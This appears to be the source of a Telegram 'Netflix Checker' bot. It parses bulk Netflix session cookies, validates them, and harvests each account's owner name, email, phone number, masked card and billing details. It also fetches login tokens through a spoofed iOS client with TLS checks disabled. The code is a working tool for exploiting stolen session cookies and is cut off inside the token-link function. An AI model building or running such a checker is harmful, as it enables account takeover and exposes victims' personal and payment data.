import copy
import html
import json
import os
import random
import re
import shutil
import string
import sys
import time
import unicodedata
import zipfile
from datetime import datetime, timedelta, timezone
from io import BytesIO

import requests
from urllib3.exceptions import InsecureRequestWarning

# Telegram imports
try:
    from telegram import Update, BotCommand
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None

# ==================== READ BOT TOKEN ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    print("Please add BOT_TOKEN in Railway Environment Variables")
    sys.exit(1)

# ==================== CONFIGURATION ====================
DEFAULT_CONFIG = {
    "txt_fields": {
        "name": True, "email": True, "max_streams": True, "plan_price": True,
        "plan": True, "country": True, "member_since": True, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": True, "phone": True,
        "quality": True, "hold_status": True, "email_verified": True,
        "membership_status": True, "profiles": True, "user_guid": False,
    },
    "nftoken": "both",
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

DEFAULT_YAML_CONFIG = """# Netflix Checker Configuration
txt_fields:
  name: true
  email: true
  plan: true
  country: true
  member_since: true
  quality: true
  max_streams: true
  plan_price: true
  next_billing: true
  payment_method: true
  card: true
  phone: true
  hold_status: true
  extra_members: true
  email_verified: true
  membership_status: true
  profiles: true
  user_guid: false

nftoken: "both"
add_emojis: "webhook"

notifications:
  webhook:
    enabled: false
    url: ""
    mode: "full"
    plans: "all"
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
    mode: "full"
    plans: "all"

display:
  mode: "simple"

retries:
  error_proxy_attempts: 3
  nftoken_attempts: 1

performance:
  request_timeout_seconds: 15
  fallback_account_page: false
  retry_incomplete_info: false
  nftoken_for_free: false
"""

APP_VERSION = "4.5.0"

# Folders
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"

# Bot stats
bot_application = None
stats = {"total": 0, "valid": 0, "free": 0, "failed": 0, "processing": 0}
user_tasks = {}

# NFToken API settings
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== HELPER FUNCTIONS ====================

def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")

def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

def clean_text(text):
    """تنظيف النصوص من الرموز المشفرة"""
    if not text:
        return None
    text = html.unescape(text)
    text = text.replace('\\x20', ' ')
    text = text.replace('\\x40', '@')
    text = text.replace('\\u00A0', ' ')
    text = text.replace('&nbsp;', ' ')
    text = text.replace('\\x2F', '/')
    text = text.replace('\\"', '"')
    text = re.sub(r'\\x[0-9a-fA-F]{2}', '', text)
    if len(text) == 5 and text[2] == ' ' and text[0:2] == text[3:5]:
        text = text[0:2]
    return text.strip()

def decode_netflix_value(value):
    if value is None:
        return None
    return clean_text(str(value))

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    return cleaned.lower() in {"true", "yes", "1", "on"}

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

def normalize_phone_number(phone, country_code=None):
    """تنسيق رقم الهاتف"""
    if not phone:
        return None
    cleaned = re.sub(r'\D', '', str(phone))
    if not cleaned:
        return phone
    
    if country_code in ["ZA", "South Africa"]:
        if cleaned.startswith('0'):
            cleaned = '27' + cleaned[1:]
        if not cleaned.startswith('27') and len(cleaned) >= 9:
            cleaned = '27' + cleaned
    elif country_code in ["ID", "IN"]:
        if cleaned.startswith('0'):
            cleaned = '62' + cleaned[1:]
        if not cleaned.startswith('62') and len(cleaned) >= 10:
            cleaned = '62' + cleaned
    elif country_code == "RO":
        if cleaned.startswith('0'):
            cleaned = '40' + cleaned[1:]
        if not cleaned.startswith('40') and len(cleaned) >= 9:
            cleaned = '40' + cleaned
    elif country_code in ["ES", "Spain"]:
        if cleaned.startswith('0'):
            cleaned = '34' + cleaned[1:]
        if not cleaned.startswith('34') and len(cleaned) >= 9:
            cleaned = '34' + cleaned
    
    if len(cleaned) >= 10:
        return f"+{cleaned}"
    return cleaned


def get_full_country_name(country_code):
    """تحويل كود الدولة لاسم كامل"""
    countries = {
        "ZA": "South Africa",
        "EG": "Egypt",
        "SA": "Saudi Arabia",
        "AE": "United Arab Emirates",
        "US": "United States",
        "GB": "United Kingdom",
        "IN": "India",
        "PK": "Pakistan",
        "RO": "Romania",
        "ID": "Indonesia",
        "MY": "Malaysia",
        "SG": "Singapore",
        "PH": "Philippines",
        "TH": "Thailand",
        "VN": "Vietnam",
        "BR": "Brazil",
        "MX": "Mexico",
        "CA": "Canada",
        "AU": "Australia",
        "DE": "Germany",
        "FR": "France",
        "ES": "Spain",
        "IT": "Italy",
        "TR": "Turkey",
        "NL": "Netherlands",
        "SE": "Sweden",
        "NO": "Norway",
        "DK": "Denmark",
        "FI": "Finland",
        "PL": "Poland",
        "GR": "Greece",
        "PT": "Portugal",
        "IE": "Ireland",
        "BE": "Belgium",
        "CH": "Switzerland",
        "AT": "Austria",
        "CZ": "Czech Republic",
        "HU": "Hungary",
        "IL": "Israel",
        "JP": "Japan",
        "KR": "South Korea",
        "CN": "China",
        "TW": "Taiwan",
        "HK": "Hong Kong",
    }
    return countries.get(country_code.upper(), country_code)


def clean_profile_names(profiles_raw):
    """تنقية أسماء البروفايلات وإزالة أسماء الأجهزة والكلمات الغريبة"""
    if not profiles_raw:
        return [], 0
    
    forbidden_names = [
        'android', 'tablet', 'apple', 'windows', 'mac', 'linux',
        'chrome', 'firefox', 'safari', 'edge', 'opera', 'brave',
        'ios', 'ipad', 'iphone', 'smart tv', 'tv', 'netflix',
        'profile', 'user', 'default', 'unknown', 'device',
        'mobile', 'phone', 'computer', 'pc', 'laptop', 'desktop',
        'smartphone', 'ipod', 'watch', 'android tv', 'roku',
        'apple tv', 'google tv', 'amazon', 'fire stick', 'chromecast',
        'api', 'akira', 'buildidentifier', 'identifier', 'null',
        'undefined', 'none', 'nil', 'false', 'true', 'build',
        'premium', 'standard', 'basic', 'free'
    ]
    
    names_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
    
    clean_names = []
    for name in names_list:
        name_lower = name.lower()
        
        if name_lower in forbidden_names:
            continue
        if len(name) < 2:
            continue
        
        skip = False
        for forbidden in forbidden_names:
            if forbidden in name_lower:
                skip = True
                break
        if skip:
            continue
        
        if re.match(r'^\d+$', name):
            continue
        if re.search(r'[{}[]<>]', name):
            continue
            
        clean_names.append(name)
    
    if not clean_names:
        for name in names_list:
            if name.lower() not in forbidden_names:
                clean_names.append(name)
                break
    
    return clean_names, len(clean_names)


def get_membership_status_display(status):
    """تحويل حالة العضوية لنص مفهوم"""
    status_map = {
        "current_member": "Active",
        "former_member": "Cancelled / Expired",
        "active": "Active",
        "current": "Active",
        "past_due": "Past Due",
        "cancelled": "Cancelled"
    }
    normalized = normalize_plan_key(status) if status else "unknown"
    return status_map.get(normalized, status or "Unknown")


def extract_payment_method_strong(html_content, info):
    """استخراج وسيلة الدفع من كل المصادر الممكنة"""
    
    payment = info.get("paymentMethodType")
    if payment and payment != "Unknown" and payment != "N/A" and payment != "null":
        if payment.upper() == "CC":
            return "Credit Card"
        if payment.upper() == "PAYPAL":
            return "PayPal"
        if payment.upper() in ["IDEAL", "IDeal"]:
            return "iDEAL"
        if payment.upper() in ["GIFT", "GIFT CARD"]:
            return "Gift Card"
        return payment
    
    billing_match = re.search(r'"billingInfo"\s*:\s*{[^}]*"paymentMethod"\s*:\s*"([^"]+)"', html_content)
    if billing_match:
        payment = decode_netflix_value(billing_match.group(1))
        if payment:
            if payment.upper() == "CC":
                return "Credit Card"
            return payment
    
    patterns = [
        r'"paymentMethodType"\s*:\s*"([^"]+)"',
        r'"paymentOptionLogo"\s*:\s*"([^"]+)"',
        r'"paymentMethod"\s*:\s*"([^"]+)"',
        r'"paymentType"\s*:\s*"([^"]+)"',
        r'"payer"\s*:\s*"([^"]+)"',
        r'"billingMethod"\s*:\s*"([^"]+)"',
        r'"method"\s*:\s*"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            payment = decode_netflix_value(match.group(1))
            if payment and payment not in ["Unknown", "N/A", "null", "", None]:
                if payment.upper() == "CC":
                    return "Credit Card"
                if payment.upper() == "PAYPAL":
                    return "PayPal"
                return payment
    
    card = info.get("maskedCard")
    if card and card != "N/A" and card != "Unknown":
        return "Credit Card"
    
    html_lower = html_content.lower()
    if "credit card" in html_lower or "visa" in html_lower or "mastercard" in html_lower:
        return "Credit Card"
    if "paypal" in html_lower:
        return "PayPal"
    if "ideal" in html_lower:
        return "iDEAL"
    
    return "Credit Card"


# ==================== COOKIE EXTRACTION FUNCTIONS ====================

def is_netflix_domain(domain):
    domain = str(domain or "").replace("#HttpOnly_", "").lower()
    return "netflix." in domain

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)

def canonicalize_netflix_cookie_name(name):
    return str(name or "").strip()

def is_netflix_cookie_entry(domain, name):
    return name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    return bool(cookie_dict.get("NetflixId"))

def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
        if "cookies" in json_data:
            json_data = json_data["cookies"]
        elif "items" in json_data:
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""
    netscape_lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        netscape_lines.append(f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}")
    return "\n".join(netscape_lines)

def split_netscape_cookie_columns(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return []
    if line.startswith("#HttpOnly_"):
        line = line[10:]
    parts = line.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", line, 6)
    return parts if len(parts) >= 7 else []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for idx, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain, tail, path, secure, expires, name, value = parts
        if is_netflix_cookie_entry(domain, name):
            entries.append({
                "domain": domain, "tail_match": tail, "path": path,
                "secure": secure, "expires": expires, "name": name,
                "value": value, "position": idx
            })
    return entries

def extract_json_cookie_entries(content):
    try:
        data = json.loads(content)
    except:
        return []
    if isinstance(data, dict):
        if "cookies" in data:
            data = data["cookies"]
        elif "items" in data:
            data = data["items"]
        else:
            data = [data]
    if not isinstance(data, list):
        return []
    entries = []
    for idx, cookie in enumerate(data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        entries.append({
            "domain": domain, "tail_match": tail, "path": path,
            "secure": secure, "expires": expires, "name": name,
            "value": value, "position": idx
        })
    return entries

def extract_raw_cookie_entries(raw_text):
    entries = []
    for idx, match in enumerate(re.finditer(r"(NetflixId|SecureNetflixId|nfvdid)\s*[:=]\s*([^\s;,\"]+)", raw_text, re.I)):
        name = match.group(1)
        value = match.group(2).strip("\"'")
        entries.append({
            "domain": ".netflix.com", "tail_match": "TRUE", "path": "/",
            "secure": "TRUE", "expires": "0", "name": name,
            "value": value, "position": idx
        })
    return entries

def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    by_name = {}
    for e in entries:
        by_name.setdefault(e["name"], []).append(e)
    bundle_count = max(len(v) for v in by_name.values())
    bundles = []
    for i in range(bundle_count):
        selected = []
        for name, lst in by_name.items():
            if i < len(lst):
                selected.append(lst[i])
            elif len(lst) == 1:
                selected.append(lst[0])
        selected.sort(key=lambda x: x.get("position", 0))
        netscape = "\n".join(
            f"{e['domain']}\t{e['tail_match']}\t{e['path']}\t{e['secure']}\t{e['expires']}\t{e['name']}\t{e['value']}"
            for e in selected
        )
        cookies = {e["name"]: e["value"] for e in selected}
        bundles.append({"netscape_text": netscape, "cookies": cookies})
    return bundles

def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7:
            domain, _, _, _, _, name, value = parts
            if is_netflix_cookie_entry(domain, name):
                cookies[name] = value
    return cookies


# ==================== ADVANCED ACCOUNT INFO EXTRACTION ====================

def extract_graphql_data(html_content):
    """استخراج GraphQL payload من HTML"""
    results = {}
    
    script_pattern = r'<script[^>]*>window\.__NUXT__\s*=\s*({.*?})</script>'
    match = re.search(script_pattern, html_content, re.DOTALL)
    
    if match:
        try:
            data = json.loads(match.group(1))
            if 'state' in data:
                state = data['state']
                for key, value in state.items():
                    if 'growthAccount' in str(key) or 'account' in str(key):
                        if isinstance(value, dict):
                            ga = value.get('data', {}).get('growthAccount', {})
                            if ga:
                                results = extract_account_info(ga)
                                if results:
                                    return results
        except:
            pass
    
    json_pattern = r'{"data":\s*{[^}]*"growthAccount"[^}]*}}'
    json_match = re.search(json_pattern, html_content)
    if json_match:
        try:
            data = json.loads(json_match.group(0))
            ga = data.get('data', {}).get('growthAccount', {})
            results = extract_account_info(ga)
        except:
            pass
    
    return results

def extract_account_info(growth_account):
    """استخراج بيانات الحساب من growthAccount"""
    info = {}
    
    info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName'))
    if not info['accountOwnerName']:
        info['accountOwnerName'] = decode_netflix_value(growth_account.get('accountOwnerName'))
    
    info['email'] = decode_netflix_value(growth_account.get('email'))
    info['countryOfSignup'] = decode_netflix_value(growth_account.get('countryOfSignUp', {}).get('code'))
    info['memberSince'] = decode_netflix_value(growth_account.get('memberSince'))
    info['membershipStatus'] = decode_netflix_value(growth_account.get('membershipStatus'))
    info['userGuid'] = decode_netflix_value(growth_account.get('ownerGuid'))
    info['isUserOnHold'] = growth_account.get('isUserOnHold', False)
    
    current_plan = growth_account.get('currentPlan', {}).get('plan', {})
    info['localizedPlanName'] = decode_netflix_value(current_plan.get('name'))
    info['planPrice'] = decode_netflix_value(current_plan.get('priceDisplay'))
    info['videoQuality'] = decode_netflix_value(current_plan.get('videoQuality'))
    info['maxStreams'] = current_plan.get('maxStreams')
    
    next_billing = growth_account.get('nextBillingDate', {})
    info['nextBillingDate'] = decode_netflix_value(next_billing.get('localDate') or next_billing.get('date'))
    
    payment_methods = growth_account.get('growthPaymentMethods', [])
    if payment_methods:
        pm = payment_methods[0]
        info['paymentMethodType'] = decode_netflix_value(pm.get('paymentOptionLogo'))
        info['maskedCard'] = decode_netflix_value(pm.get('displayText'))
    
    phone = growth_account.get('growthLocalizablePhoneNumber', {})
    phone_raw = decode_netflix_value(phone.get('rawPhoneNumber'))
    phone_country = decode_netflix_value(phone.get('countryCode'))
    info['phoneNumber'] = normalize_phone_number(phone_raw, phone_country)
    info['phoneVerified'] = phone.get('isVerified', False)
    
    email_obj = growth_account.get('growthEmail', {})
    if email_obj:
        email_value = decode_netflix_value(email_obj.get('email', {}).get('value'))
        if email_value:
            info['email'] = email_value
        info['emailVerified'] = email_obj.get('isVerified', False)
    
    profiles = growth_account.get('profiles', [])
    profile_names = []
    for p in profiles:
        name = decode_netflix_value(p.get('name'))
        if name and name.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'windows', 'mac', 'linux']:
            profile_names.append(name)
    if not profile_names and profiles:
        profile_names = [decode_netflix_value(p.get('name')) for p in profiles if p.get('name')]
    
    info['profiles'] = ", ".join(profile_names) if profile_names else None
    info['profileCount'] = len(profile_names)
    
    info['showExtraMemberSection'] = "Yes" if growth_account.get('showExtraMemberSection') else "No"
    
    return {k: v for k, v in info.items() if v}

def get_name_from_profiles(info):
    """استخراج الاسم من أول بروفايل حقيقي"""
    profiles_raw = info.get("profiles") or ""
    if profiles_raw:
        clean_names, _ = clean_profile_names(profiles_raw)
        if clean_names:
            return clean_names[0]
    return "Unknown"

def extract_profile_names(response_text):
    names = []
    for pattern in [r'"profileName"\s*:\s*"([^"]+)"', r'"profiles"\s*:\s*\[(.*?)\]', r'"name":"([^"]+)"']:
        if pattern.startswith('"profiles"'):
            profiles_match = re.search(pattern, response_text, re.DOTALL)
            if profiles_match:
                profile_names = re.findall(r'"name":"([^"]+)"', profiles_match.group(1))
                names.extend(profile_names)
        else:
            for match in re.finditer(pattern, response_text):
                name = decode_netflix_value(match.group(1))
                if name and name not in names and len(name) < 50:
                    names.append(name)
    filtered_names = [n for n in names if n.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'windows', 'mac', 'linux']]
    return ", ".join(filtered_names[:10]) if filtered_names else (", ".join(names[:10]) if names else None)

def has_any_account_info(info):
    if not info:
        return False
    important_fields = ["countryOfSignup", "membershipStatus", "localizedPlanName", "accountOwnerName", "email"]
    return any(info.get(f) for f in important_fields)

def extract_info_fallback(response_text):
    """استخراج المعلومات من HTML العادي"""
    extracted = {
        "accountOwnerName": extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"name":"([^"]+)"', r'"accountOwnerName":"([^"]+)"']),
        "email": extract_first_match(response_text, [r'"email":"([^"]+)"', r'"loginId":"([^"]+)"', r'"emailAddress":"([^"]+)"']),
        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry":"([^"]+)"', r'"countryOfSignup":"([^"]+)"', r'"country":"([^"]+)"']),
        "memberSince": extract_first_match(response_text, [r'"memberSince":"([^"]+)"', r'"joinDate":"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, [r'"nextBillingDate":"([^"]+)"', r'"billingDate":"([^"]+)"']),
        "userGuid": extract_first_match(response_text, [r'"userGuid":"([^"]+)"', r'"guid":"([^"]+)"']),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"', r'"status":"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [r'"maxStreams":(\d+)', r'"streams":(\d+)']),
        "localizedPlanName": extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"', r'"plan":"([^"]+)"']),
        "planPrice": extract_first_match(response_text, [r'"planPrice":"([^"]+)"', r'"price":"([^"]+)"', r'"formattedPlanPrice":"([^"]+)"']),
        "videoQuality": extract_first_match(response_text, [r'"videoQuality":"([^"]+)"', r'"quality":"([^"]+)"']),
        "paymentMethodType": extract_first_match(response_text, [r'"paymentMethodType":"([^"]+)"', r'"paymentType":"([^"]+)"']),
        "maskedCard": extract_first_match(response_text, [r'"maskedCard":"([^"]+)"', r'"cardNumber":"([^"]+)"', r'"lastFour":"([^"]+)"']),
        "phoneNumber": extract_first_match(response_text, [r'"phoneNumber":"([^"]+)"', r'"mobilePhone":"([^"]+)"']),
        "phoneVerified": extract_first_match(response_text, [r'"phoneVerified":"([^"]+)"', r'"isPhoneVerified":"([^"]+)"']),
        "emailVerified": extract_first_match(response_text, [r'"emailVerified":"([^"]+)"', r'"isEmailVerified":"([^"]+)"']),
        "holdStatus": extract_first_match(response_text, [r'"isUserOnHold":"([^"]+)"', r'"holdStatus":"([^"]+)"']),
        "profiles": extract_profile_names(response_text),
    }
    return {k: v for k, v in extracted.items() if v}

def extract_info(response_text):
    all_info = {}
    
    graphql_info = extract_graphql_data(response_text)
    if graphql_info and has_any_account_info(graphql_info):
        all_info.update(graphql_info)
    
    fallback_info = extract_info_fallback(response_text)
    if fallback_info:
        all_info.update(fallback_info)
    
    if all_info.get('email'):
        all_info['email'] = clean_text(all_info['email'])
    
    if all_info.get('countryOfSignup'):
        all_info['countryOfSignup'] = clean_text(all_info['countryOfSignup'])
    
    if all_info.get('memberSince'):
        all_info['memberSince'] = clean_text(all_info['memberSince'])
    
    return all_info if has_any_account_info(all_info) else {}

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    return re.sub(r"[^\w]+", "_", plan_name.lower()).strip("_")

def get_canonical_output_label(plan_key):
    labels = {"premium": "Premium", "standard": "Standard", "basic": "Basic", "mobile": "Mobile", "free": "Free"}
    return labels.get(plan_key, "Unknown")

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    norm = normalize_plan_key(raw_plan) if raw_plan else ""
    if norm in ("premium", "premium_plan", "premium_extra_member"):
        return "premium", "Premium"
    if norm in ("standard", "estandar", "standard_with_ads"):
        return "standard", "Standard"
    if norm in ("basic", "basico", "essential"):
        return "basic", "Basic"
    if norm in ("mobile", "ponsel", "seluler"):
        return "mobile", "Mobile"
    streams = info.get("maxStreams")
    if streams:
        try:
            streams = int(str(streams))
            if streams >= 4:
                return "premium", "Premium"
            if streams >= 2:
                return "standard", "Standard"
            if streams == 1:
                return "basic", "Basic"
        except:
            pass
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = normalize_plan_key(info.get("membershipStatus"))
    return status in ["current_member", "active", "current"]

def is_extra_member_account(info):
    plan = str(info.get("localizedPlanName", "")).lower()
    return "extra" in plan or "miembro extra" in plan

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    cleaned = clean_text(cleaned)
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %d, %Y")
    except:
        pass
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    cleaned = clean_text(cleaned)
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %Y")
    except:
        pass
    return cleaned

def country_code_to_flag(country_code):
    raw = decode_netflix_value(country_code) or ""
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw.upper())
    return ""

def format_country_with_flag(country_value):
    country_code = decode_netflix_value(country_value) or "Unknown"
    country_name = get_full_country_name(country_code)
    flag = country_code_to_flag(country_code)
    return f"{country_name} {flag}".strip()

def get_nftoken_mode(config):
    val = config.get("nftoken", "both")
    if isinstance(val, bool):
        return "both" if val else "false"
    return str(val).lower()

def has_usable_nftoken(data):
    return data and data.get("token")

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        if token:
            expiry = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
            return {"token": token, "expires_at_utc": expiry}, None
    except:
        pass
    return None, "Failed"

def build_nftoken_links(token, mode):
